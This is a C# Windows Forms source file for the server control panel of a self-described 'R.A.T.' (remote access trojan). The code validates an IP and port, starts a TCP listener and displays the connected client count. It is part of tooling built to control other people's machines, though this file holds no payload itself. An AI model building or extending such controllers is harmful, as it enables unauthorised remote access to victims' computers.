using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace server
{
	public partial class serverform : Form
	{
		public static serverform instance;
		public serverform()
		{
			InitializeComponent();
			instance = this;
			if (Form1.instance.server.IsStarted)
			{
				server_startbtn.Enabled = false;
				server_statuslabel.Text = "Status: Running";
				server_iplabel.Text = "Server IP: " + Form1.instance.server_IP;
				server_portlabel.Text = "Server Port: " + Form1.instance.server_port;
				server_clientslabel.Text = "Clients Connected: " + Form1.instance.clients_list.Count;
				iptextbox.Text = Form1.instance.server_IP;
				porttextbox.Text = Form1.instance.server_port;
				iptextbox.Enabled = false;
				porttextbox.Enabled = false;
			}
			else
            {
				IPHostEntry host;
				host = Dns.GetHostEntry(Dns.GetHostName());

				foreach (IPAddress ip in host.AddressList)
				{
					if (ip.AddressFamily == AddressFamily.InterNetwork && ip.ToString().StartsWith("192.") && ip.ToString().Contains(".0"))
					{
						iptextbox.Text = ip.ToString();
						break;
					}
				}
			}
		}

		public void modifyclients(int number)
		{
			server_clientslabel.Text = "Clients Connected: " + number;
		}

		private void server_startbtn_Click(object sender, EventArgs e)
		{
			if (Form1.instance.server.IsStarted) return;
			if (iptextbox.Text.Length < 3)
			{
				serverlog.instance.log("The IP address you entered is invalid.\n");
				return;
			}
			int port = int.Parse(porttextbox.Text);
			if (port > 65535 || port < 1)
			{
				serverlog.instance.log("The port you entered is invalid.\n");
				return;
			}
			serverlog.instance.log("Starting R.A.T server on " + iptextbox.Text + ":" + porttextbox.Text + ".\n");
			try
			{
				Form1.instance.server.Start(System.Net.IPAddress.Parse(iptextbox.Text), int.Parse(porttextbox.Text));
				server_startbtn.Enabled = false;
				serverlog.instance.log("Server started.\n");
				server_statuslabel.Text = "Status: Running";
				server_iplabel.Text = "Server IP: " + iptextbox.Text;
				server_portlabel.Text = "Server Port: " + porttextbox.Text;
				Form1.instance.server_IP = iptextbox.Text;
				Form1.instance.server_port = porttextbox.Text;
				iptextbox.Enabled = false;
				porttextbox.Enabled = false;
			}
			catch (Exception ee)
			{
				serverlog.instance.log("Server threw an error while opening:\n");
				serverlog.instance.log(ee.Message + "\n");
			}
		}
	}
}
